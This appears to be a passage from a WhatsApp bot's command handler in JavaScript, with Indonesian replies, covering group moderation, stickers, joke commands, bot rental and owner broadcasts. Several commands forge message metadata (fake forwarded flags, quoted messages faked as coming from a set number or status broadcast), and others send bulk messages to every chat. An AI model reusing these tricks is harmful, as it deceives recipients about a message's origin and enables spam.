    "jpegThumbnail": fs.readFileSync('./image/cewe.jpeg')               
    }}, MessageType.buttonsMessage, {quoted: ftroli, contextInfo:{mentionedJid: parseMention(`${texxt}`, `${desc1}`)}})  
                     
    break
            case 'sc':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            se =`
SC1 : https://github.com/
SC2 : https://github.com/
Rest Api : https://
apikey = ZiyKey`
			replyWithFakeLink(se)
			break
		    //==================[ DETECTED ]==================\\
            case 'sewabot':
			const buttonss = [{buttonId: `${prefix}yabang`, buttonText: {displayText: 'iya yakin'}, type: 1},{buttonId: `${prefix}Gakah`, buttonText: {displayText: 'Tidak jadi'}, type: 1}]
			const buttonMessagee = {
			headerType: "IMAGE",
			contentText: "yakin lu mau sewbot?/gak sewa gw bunuh lu",
			footerText: 'Chiel????19.0.0',
			buttons: buttonss,
			headerType: 1
			}
            ALDI.sendMessage(from, buttonMessagee, MessageType.buttonsMessage, 
            {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `6287727925499@s.whatsapp.net`, 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": `*???????????????? ???????? ???????????? ????????????????*\n${gaya}Made By: DI V A${gaya}`, 'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}})
            break
            case 'gaklah':
            reply(`${gaya}oke bang????${gaya}`)
            break
            case 'yabang':
            listt = `
List Sewa Bot
1 bulan : 12k
4 bulan : 25k
permanen : 35k

List Premium Bot
1 bulan : 5k
2 bulan : 10k
permanen : 25k

Minat Chat owner
`
let prep = await ALDI.prepareMessage(from, cewe, image)
let imgMsg = prep.message.imageMessage
res = await ALDI.prepareMessageFromContent(from,{
"productMessage":{
"product":{
"productImage": imgMsg,
"productId": "5778732458865756",
"title": `LIST SEWA ${nb}`,
"description": `${listt}`,
"currencyCode": "IDR",
"priceAmount1000": "100000",
"productImageCount": 1
},
"businessOwnerJid": "6287727925499@s.whatsapp.net",
}
}, {quoted: ftroli, mimetype: 'image/jpeg'})
ALDI.relayWAMessage(res)
			const buttonsss = [{buttonId: `${prefix}owner`, buttonText: {displayText: 'owner bot'}, type: 1}]
			const buttonMessageee = {
			headerType: "IMAGE",
			contentText: "ketik di bawah ini buat chat owner",
			footerText: 'chiel ????19.0.0',
			buttons: buttonsss,
			headerType: 1
			}
            ALDI.sendMessage(from, buttonMessageee, MessageType.buttonsMessage, 
            {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `6287727925499@s.whatsapp.net`, 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": `*???????????????? ???????????????? ???????????? ????????????????*\n${gaya}Made By: ALDI FAUZI${gaya}`, 'jpegThumbnail': fs.readFileSync('./image/thumb.jpeg')}}}})
break
    case 'butloc':
   texxt = ` test bang`
   desc1 = `test bang`
    const buttonssss = [{buttonId: `${prefix}owner`, buttonText: {displayText: 'owner bot'}, type: 1}]
    ALDI.sendMessage(from, 
    {"contentText": `${texxt}`,
               
    "footerText": `${desc1}`, 
               
    "buttons": buttonssss,
               
    "headerType": "LOCATION",
                       
    "locationMessage": {
                   
    "text": "halo",
                   
    "name": "South Brisbane",
                   
    "address": "Cloudflare, Inc",
                   
    "jpegThumbnail": fs.readFileSync('./image/thumb.jpeg')               
    }}, MessageType.buttonsMessage, {quoted: ftroli, contextInfo:{mentionedJid: parseMention(`${texxt}`, `${desc1}`)}})  
                     
    break
            case 'antiviewonce':
            case 'antivo':
                
            if (!isGroup) return reply(mess.group)
                
            if (!isGroupAdmins && !isOwner) return reply(mess.admin)
                
   		    if (args.length < 1) return reply(`Pilih enable atau disable`)
                
            if ((args[0]) === 'on') {                    
            if (isAntiVO) return reply(`Udah aktif`)
                    
            antiviewonce.push(from)
					
            fs.writeFileSync('./data/antiviewonce.json', JSON.stringify(antiviewonce))
					
            reply('Antiview Once grup aktif')
                
            } else if ((args[0]) === 'off') {                      
            antiviewonce.splice(from, 1)
                    
            fs.writeFileSync('./data/antiviewonce.json', JSON.stringify(antiviewonce))
                    
            reply('antiviewonce grup nonaktif')
                
            } else {
                    
		    reply('on untuk mengaktifkan, off untuk menonaktifkan')			        
            }
                
            break
 
            case 'read': case 'sider':
            if (!isGroupAdmins && !itsMe && !isOwner)return reply(mess.admin)
            if (!isGroup) return reply(mess.group)

            if (!isQuotedMsg)return reply('Reply pesan bot')
            infom = await ALDI.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
            tagg = []
teks = `Telah Dibaca Oleh :\n\n`
            for(let i of infom.reads){

            teks += '???'+' ' + '@' + i.jid.split('@')[0] + '\n'
            teks += `?????? ??? Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)

            }

            mentions(teks, tagg, true)
            break
            case 'hidetag':
            case 'h':
            if (!isGroup) return reply(mess.group)
            if (!isGroupAdmins && !itsMe && !isOwner)return reply(mess.admin)
            if (!q)return reply('Ingfonya apa?')
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
text: q,
contextInfo: { mentionedJid: mem },
quoted: mek
}
            ALDI.sendMessage(from, options, text)
            break
            case 'tovid': case 'tovideo':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            if (!isQuotedSticker) return reply('Reply stiker nya')
            if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.xtInfo

            media = await ALDI.downloadAndSaveMediaMessage(encmedia)

            mik = await webp2gifFile(media)
            reply(mess.wait)
            console.log(mik)
            sendMediaURL(from, mik.result, 'Nih..')
            limitAdd(sender, limit)
            break
						

            case 'togif':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            if (!isQuotedSticker) return reply('Reply stiker nya')
            if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
            media = await ALDI.downloadAndSaveMediaMessage(encmedia)
            mik = await webp2gifFile(media)
            reply(mess.wait)
            console.log(mik)
            anu = await getBuffer(mik.result)
            ALDI.sendMessage(from, anu, video, {mimetype: 'video/gif', caption: 'Nih..', quoted: mek})
            limitAdd(sender, limit)
            break
            // Set Description Group ( MyMans APIs )
            case 'setdesc':
            case'setdescgc':
            if (!isOwner && !itsMe && !isGroupAdmins) return reply(mess.admin)
            if(!q)return reply('Mau ganti Deskripsi Group nya apa?')
            if (!isBotGroupAdmins) return reply(mess.Badmin)
            if (!isGroup) return reply(mess.group)
            ALDI.groupUpdateDescription(from, `${q}`)
            ALDI.sendMessage(from, 'Succes change description group', text, {quoted:mek})
            break

            // Set Name Group ( MyMans APIs )
            case 'setname':
            case 'setnamegc':
            if (!isOwner && !itsMe && !isGroupAdmins) return reply(mess.admin)
            if(!q)return reply('Mau ganti Nama GC nya apa?')
            if (!isBotGroupAdmins) return reply(mess.Badmin)
            if (!isGroup) return reply(mess.group)
            ALDI.groupUpdateSubject(from, `${q}`)
            ALDI.sendMessage(from, 'Succes change name group', text, {quoted:mek})
            break
            case 'linkgroup':
            case 'linkgc':
            if (!isGroup) return reply(mess.group)
            if (!isGroupAdmins && !itsMe && !isOwner) return reply(mess.admin)
            if (!isBotGroupAdmins) return reply(mess.Badmin)
            linkgc = await ALDI.groupInviteCode(from)
            reply('https://chat.whatsapp.com/'+linkgc)
            break

            case 'resetlink': case 'revokelink': case 'revoke':

            if (!isGroupAdmins && !itsMe && !isOwner) return reply(mess.admin)
            if (!isBotGroupAdmins) return reply (mess.Badmin)
            ALDI.query({ json: ['action', 'inviteReset', from], expect200: true })
            linkgc = await ALDI.groupInviteCode(from)
            reply('Succses Revoke!\n\nLink Group new:\nhttps://chat.whatsapp.com/'+linkgc)
            break
            
		    case 'welcome':
		    
		    if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(mess.admin)
		    
		    if (args.length < 1) return reply(`Ketik ${prefix + command} aktif/nonaktif`)
			
		    if ((args[0]) === 'aktif') {
		    
		    if (isWelkom) return reply('udah aktif')
			
		    welkom.push(from)
			
		    fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
			
		    reply(`\`\`\`???Sukses mengaktifkan fitur di group\`\`\` *${groupMetadata.subject}*`)
			
		    } else if ((args[0]) === 'nonaktif') {
			
		    if (!isWelkom) return reply('udah nonaktif')
			
		    welkom.splice(from, 1)
			
		    fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
			
		    reply(`\`\`\`Sukses menonaktifkan fitur di group\`\`\` *${groupMetadata.subject}*`)
			
		    } else {
		
		    reply('aktif untuk mengaktifkan, nonaktif untuk menonaktifkan')
			
		    }
			
		    break
			
		    case 'groupdetect':
			
		    case 'gcdtc':
			
		    case 'gcdetect':
			
		    if (!isOwner && !mek.key.fromMe) return reply(mess.owner)
	       
		    if (args.length < 1) return reply(`Ketik ${prefix + command} on/off`)
		   
		    if ((args[0]) === 'on') {
		    
		    if (isGcdetect) return reply('udah on')
			
		    gcdetect.push(from)
			
		    fs.writeFileSync('./src/gcdetect.json', JSON.stringify(gcdetect))
	        
		    reply(`\`\`\`???Sukses mengaktifkan fitur di group\`\`\` *${groupMetadata.subject}*`)
			
		    } else if ((args[0]) === 'off') {
			
		    if (!isGcdetect) return reply('sudah off')
			
		    gcdetect.splice(from, 1)
			
		    fs.writeFileSync('./src/gcdetect.json', JSON.stringify(gcdetect))
			
		    reply(`\`\`\`???Sukses menonaktifkan fitur di group\`\`\` *${groupMetadata.subject}*`)
			
		    } else {
			
		    reply('on untuk mengaktifkan, off untuk menonaktifkan')
			
		    }
		        	
		    break
            case 'antilink': 
            if (!isBotGroupAdmins) return reply(mess.badmin)			
			if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply(`LU ADMIN??`)
			if (args.length < 1) return reply('PILIH 1/0')
			if (Number(args[0]) === 1) {
			if (isAntiLink) return reply('*SUDAH AKTIF* !!!')
			antilink.push(from)
			fs.writeFileSync('./src/.dat/antilink.json', JSON.stringify(antilink))
			reply('*[???] SUCCESS ENABLE ANTILINK*')
			reply(`*??? WARNING ???\n\njika bukan admin group kalian dilarang mengirim link group!!*`)
			} else if (Number(args[0]) === 0) {
			antilink.splice(from, 1)
			fs.writeFileSync('./src/.dat/antilink.json', JSON.stringify(antilink))
			reply('*[???] SUCCESS DISABLE ANTILINK*')
			} else {
			reply(`PILIH 1/0`)
			}
			break
            case 'antijualan': 
            if (!isBotGroupAdmins) return reply(mess.badmin)			
			if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply(`LU ADMIN??`)
			if (args.length < 1) return reply('PILIH 1/0')
			if (Number(args[0]) === 1) {
			if (isjasa) return reply('*SUDAH AKTIF* !!!')
			_jasa.push(from)
			fs.writeFileSync('./src/.dat/antijasa.json', JSON.stringify(_jasa))
			reply('*[???] SUCCESS ENABLE ANTIN JUALAN*')
			reply(`*??? WARNING ???\n\njika bukan admin group kalian dilarang jualan di group!!*`)
			} else if (Number(args[0]) === 0) {
			_jasa.splice(from, 1)
			fs.writeFileSync('./src/.dat/antijasa.json', JSON.stringify(_jasa))
			reply('*[???] SUCCESS DISABLE ANTIJUALAN*')
			} else {
			reply(`PILIH 1/0`)
			}
			break

			case 'bisakah':
			if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} aku jadi ganteng`)
			const bisa = ['Tentu Saja Bisa! Kamu Adalah Orang Paling Homky', 'Gak Bisa Ajg Aowkwowk', 'Hmm Gua Gak Tau Yaa, tanya ama bapakau', 'Ulangi Tod Gua Ga Paham']
			const keh = bisa[Math.floor(Math.random() * bisa.length)]
			reply('Pertanyaan : bisakah ' + q + '\n\nJawaban : ' + keh)
			break
			case 'kapankah':
			if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} aku jadi wibu`)
			const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
			const koh = kapan[Math.floor(Math.random() * kapan.length)]
			reply('Pertanyaan : kapankah ' + q + '\n\nJawaban : ' + koh)
			break
			case 'apakah':
			if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
			const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Ulangi bro gak paham']
			const kah = apa[Math.floor(Math.random() * apa.length)]
			reply('Pertanyaan : apakah ' + q + '\n\nJawaban : ' + kah)
			break
			case 'rate':
			if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} kegantengan saya`)
			const ra = ['4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
			const te = ra[Math.floor(Math.random() * ra.length)]
reply('Pertanyaan : ' + q + '\n\nJawaban : ' + te + '%')
			break

			case 'hobby':
			if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Rara`)
			const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
			const by = hob[Math.floor(Math.random() * hob.length)]
reply(`Pertanyaan : hobby` + q + '\n\nJawaban : ' + by)
			break
			case 'getstatus':
			case 'getbio':
			if (mek.message.extendedTextMessage != undefined){
			mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
			var pde = await ALDI.getStatus(`${mentioned}`, MessageType.text)
			reply(pde.status)
			if (pde.status == 401) {
			reply("Status Profile Not Found")
			}
			} else {
			reply('Reply pesan atau tag member')
			}
			break
			case 'getpic':
			if (mek.message.extendedTextMessage != undefined){
			mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
	
			try {
	
			pic = await ALDI.getProfilePicture(mentioned[0])
	
			} catch {
	
			pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
	
			}

			thumb = await getBuffer(pic)

			ALDI.sendMessage(from, thumb,image,{quoted : mek})

			} else {

			reply('Reply pesan atau tag member')

			}

			break
				

			case 'me': 
			case 'profile':

			try {
			ppimg = await ALDI.getProfilePicture(`${sender.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
			const prmm = isPremium ? `${cekprm.days} day ${cekprm.hours} hour ${cekprm.minutes} minute ${cekprm.seconds} second`:'Not Premium'
			teks = `
??? *??? Profile User ???* ???

??? *??? User ${pushname} ???*
??? *Tag : @${sender.split("@")[0]}*
??? *Status : ${isPremium ? 'Premium':'Free'}*
??? *Status Bot : ${isOwner ? 'Owner':'User'}*
??? *Expired : ${prmm}*
??? *Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*
??? *Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*
??? *Balance User : $${getBalance(sender, balance)}*`
			its = await getBuffer (ppimg)
			ALDI.sendMessage(from, its, image, {contextInfo: { forwardingScore: 9999, isForwarded: true, mentionedJid: [sender]},quoted: mek, caption: teks
})
			break
			case 'del' :
			case 'delete':
			case 'd':
			try{

			if (!isGroupAdmins && !itsMe && !isOwner) return reply(mess.admin)			
			if(!isQuotedMsg) return reply('Reply pesan Bot!')

			pp = {id:mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true}
		    ALDI.deleteMessage(from,pp)
		    } catch(e) {
		    reply('reply pesan botnya ')
		    reply(e)
		    console.log(e)

		    }
		    break
						
			case 'tes':
			
			const buttons = [{buttonId: `#owner`, buttonText: {displayText: '???????????????????? ???????????????????'}, type: 1},
{buttonId: `#menu`, buttonText: {displayText: '??????????? ????????'}, type: 1}]
			const buttonMessage = {
			headerType: "IMAGE",
			contentText: "Active!!",
			footerText: 'CHIL ????19',
			buttons: buttons,
			headerType: 1
			}
			const sendMsg = await ALDI.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
			break					    
//====[ CASE BC ]===\\
            case 'idgroup':
		    case 'getid':
		    reply(`${from}`)
		    break
            case 'bc':
			
            if (!mek.key.fromMe && !isOwner) return reply(`khusus owner broh`)
			
            if (args.length < 1) return reply('.......')
			
            anu = await ALDI.chats.all()
			
            if (isMedia && !mek.message.videoMessage || isQuotedImage) {
			
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			
            bc = await ALDI.downloadMediaMessage(encmedia)
			
            for (let _ of anu) {
			
            ALDI.sendMessage(_.jid, bc, image, {quoted:troli,caption: `${body.slice(4)}`})
            }
		    
            reply('Suksess broadcast')

            } else {
			
            for (let _ of anu) {
			
            sendMess(_.jid, `${body.slice(4)}`)
		    
            }
			
            reply('Suksess broadcast')
		    
            }
			
            break
            case 'buttonbc':
  
            if (!mek.key.fromMe && !isOwner) return reply(`hanya owner bro`)
            if (args.length < 1) return reply('Textnya Mane?')
            anu = await ALDI.chats.all()
            for (let _ of anu) {
            const buttons = [{buttonId: `${prefix}`, buttonText: {displayText: `Siap Bang????`}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: `contact developer`}, type: 1}]
            const buttonMessage = {
            headerType: "IMAGE",
            contentText: q,
            footerText: `${gaya}GAY\nCreated By: A C H I L`,
            buttons: buttons,
            headerType: 1
            }
            ALDI.sendMessage(`${_.jid}`,
            buttonMessage,
            MessageType.buttonsMessage,
            {quoted:{key: {fromMe: false, participant: `6287727925499@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {documentMessage: {mimetype: 'application/octet-stream', title: `${gaya}BROADCAST\nWIBU${gaya}`, pageCount: 0, fileName: `${gaya}BROADCAST\nWIBU${gaya}`, jpegThumbnail: fakeimage}}}, contextInfo: {"mentionedJid" : ['6287727925499@s.whatsapp.net']}})
            }
            reply('??? ???????????????????????? ???')
            break
            case 'owner':
            case 'creatoe':
case 'developer':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            let ini_list = []
            for (let i of ownerNumber) {
            const vname = ALDI.contacts[i] != undefined ? ALDI.contacts[i].vname || ALDI.contacts[i].notify : undefined
            ini_list.push({
            "displayName": `${nw}`,
            "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${ALDI.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
            }
            hehe = await ALDI.sendMessage(from, {
            "displayName": `${ini_list.length} kontak`,
            "contacts": ini_list 
            }, 'contactsArrayMessage', { quoted: ftroli })
            ALDI.sendMessage(from,`Nih Kak ${command} ${nb}`,text,{quoted: hehe})
            break			
            case 'leaveall':            
            if (!mek.key.fromMe && !isOwner)return reply('kamu bukan Awang')
            let totalgroup = ALDI.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
            for (let id of totalgroup) {
            sendMess(id, 'Byee', null)
            await sleep(3000)
            ALDI.groupLeave(id)
            }
            break
            case 'teruskan':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			            
            ALDI.sendMessage(from, `${body.slice(9)}`, MessageType.text, {contextInfo: { forwardingScore: 210, isForwarded: true }})
            break
            case 'autoread':
            if (!itsMe && !isOwner)return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
            if ((args[0]) === 'on') {
            if(aread)return reply('_Sudah diaktifkan sebelumnya_')
            aread = true
            return reply(  `*Auto Read On!*`, text)
            } else if ((args[0]) === 'off') {
            if(!aread)return reply('_Sudah dimatikan sebelumnya_')
            aread = false
            return reply(`*Auto Read Off!*`, text)
            } else {
            reply('on untuk mengaktifkan, off untuk menonaktifkan')
            }
            break            
            case 'setbug':
            if (!itsMe && !isOwner) return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
            if (args.length < 1) return reply('bukan gitu')
            if((args[0]) == 'vn'){
            ngetik = false
            vn = true
            if(vn) return reply('_Sudah diaktifkan sebelumnya!_')
            reply(`_Succses mengganti ke vn`)
            } else
if ((args[0]) == 'ngetik'){
            ngetik = true
            vn = false
            if(ngetik)return reply('_Sudah diaktifkan sebelumnya!_')
            reply(`_Succses mengganti ngetik`)
           
}
            break            
            case 'listbot':
            case 'listjadibot':
            case 'listnumpang':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			            
            let tekss = '??? *LIST JADIBOT* ???\n'
            for(let i of listjadibot) {
            tekss += `*Nomor* : ${i.jid.split('@')[0]}\n*Nama* : ${i.name}\n*Device* : ${i.phone.device_manufacturer}\n*Model* : ${i.phone.device_model}\n\n`
            }
            reply(tekss)
            break
            case 'jadibot':
            if (!isPremium) return reply(`Kamu bukan user premium`)            
            jadibot(reply,ALDI,from)
            break
            case 'stopjadibot':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            stopjadibot(reply)
            break
            case 'shutdown':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!mek.key.fromMe && !isOwner) return 
            reply(`Bye...`)
            await sleep(3000)
            process.exit()
            break
            case 'add':
            if (!isGroup) return reply(mess.group)
            if (!isGroupAdmins) return reply(mess.admin)
            if (!isBotGroupAdmins) return reply(mess.Badmin)
            orang = args[0] + '@s.whatsapp.net'
            response = await ALDI.groupAdd(from, [orang])
o = response.participants[0]
            let inv = (Object.values(o))
            if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')

            else if(inv[0].code == 403){

            ALDI.sendMessage(from, `Mengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
            ALDI.sendGroupV4Invite(from, orang, inv[0].invite_code, inv[0].invite_code_exp,
            groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
            }
            break
            case 'radd':
            if (!isGroup) return reply(mess.group)
            if (!itsMe && !isGroupAdmins) return reply(mess.admin)
            if (!isBotGroupAdmins) return reply(mess.Badmin)
            if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
            ALDI.groupAdd(from, mentioned)
            break
            case 'kick':
            if (!isGroup) return reply(mess.group)

            if (!itsMe && !isGroupAdmins) return reply(mess.admin)
            if(!q)return reply(`*Format Error!*\n\n*Example : ${prefix + command} @tag*`)
            if (!isBotGroupAdmins) return reply(mess.Badmin)
            y = q.split('@')[1] + '@s.whatsapp.net'
            ALDI.groupRemove(from, [y])
            reply(`Succses kick target!`)
            break

            case 'rkick':
            if (!isGroup) return reply(mess.group)
            if (!itsMe && !isGroupAdmins) return reply(mess.admin)
            if (!isBotGroupAdmins) return reply(mess.Badmin)

            if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
            ALDI.groupRemove(from, mentioned)
            break
            case 'addcmd':
            case 'setcmd':
			if (isQuotedSticker) {
			if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)

	        ceemd = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
	        scmd = await ALDI.downloadMediaMessage(ceemd)
	        fs.writeFileSync(`./src/stickcmd/${q}.webp`, scmd)
			var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
			addCmd(kodenya, q)
			replyWithFakeLink(`Berhasil menyimpan Sticker Dengan Command : ${q}`)
			}
	        break

            case 'getstik':
            case 'getstikcmd':
            case 'getcmd':
            if(!q)return reply(`Example : ${prefix + command} menu`)
            try {
ga = fs.readFileSync(`./src/stickcmd/${q}.webp`)
            ALDI.sendMessage(from, ga, sticker,{quoted:mek})
            } catch {
            replyWithFakeLink('Sticker Command tidak terdaftar / Command yg anda gunakan memakai prefix!')
            }
            break	        			
			case 'delcmd':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
			
			if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
			var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')

			_scommand.splice(getCommandPosition(kodenya), 1)
			fs.writeFileSync('./src/scommands.json', JSON.stringify(_scommand))
			replyWithFakeLink("succes delete")
			break

			case 'listcmd':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)						
			let teksnyee = `\`\`\` LIST STICKER CMD \`\`\``
			let cemde = [];
			for (let i of _scommand) {
			cemde.push(i.id)
			teksnyee += `\n\n*ID:* ${i.id}\n*CMD:* ${i.chats}`
			}
			replyWithFakeLink(teksnyee)
			break
            case 'notif':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            					
            if (!isGroup) return reply(mess.group)
            teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
            group = await ALDI.groupMetadata(from);
            member = group['participants']
            jids = [];
            member.map(async adm => {
            jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
            })
            options = {
            text: teks,
            contextInfo: {
            mentionedJid: jids
            },
            quoted: ftroli
            }
            await ALDI.sendMessage(from, options, text)
            break
            case 'delvote':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!mek.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
            case 'voting':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!isGroupAdmins && !mek.key.fromMe) return 
            if(!isGroup) return reply(mess.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ???\ndevote = ???\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
            case 'linkwa':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*??? _LINK WA_ ???*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
            case 'igstory': 
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
            if(i.url.includes('mp4')){
            let link = await getBuffer(i.url)
            ALDI.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
            } else {
            let link = await getBuffer(i.url)
            ALDI.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})            
            }
            }
            });
            break
            case 'caripesan':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if(!q)return reply('pesannya apa bang?')
            let v = await ALDI.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await ALDI.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
